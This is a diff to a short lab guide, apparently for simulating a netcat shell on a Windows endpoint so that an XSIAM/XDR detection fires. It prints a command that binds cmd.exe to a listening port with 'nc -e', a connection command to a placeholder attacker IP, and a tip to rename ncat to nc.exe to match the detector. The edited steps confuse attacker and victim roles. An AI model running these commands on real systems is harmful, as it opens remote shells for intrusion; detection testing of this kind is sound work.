@@ -1,7 +1,16 @@
 1. In the XSIAM, Make sure there is at least 1 endpoint connected with XDR agent from which you'll simulate the attack, and an attacker machine (Kali-DC1ENV4AKALI01) to catch the connection
+
 2. Download ncat from [nmap.org](https://nmap.org/ncat/) to windows machine
-3. Change EXE name to nc.exe as expected by the detector
-4. Start a listening port on the attacker machine
-user:/$ nc -lp 1337 
-5. Run ncat on the windows machine to start a reverse connection to the attacker
+
+================ Mandatory Phase - Otherwise it won't triggered the alert ====================
+==    3. Change EXE name to nc.exe as expected by the detector                              ==
+==                                                                                          ==
+==============================================================================================
+
+4. Start a listening port on the victim machine
+nc -n -v -l - p 54321 -e c:\Windows\System32\cmd.exe 
+
+
+5. Run ncat on the windows machine to start a connection to the victim
+
 c:\> nc <attacker_ip> <listening_port> 
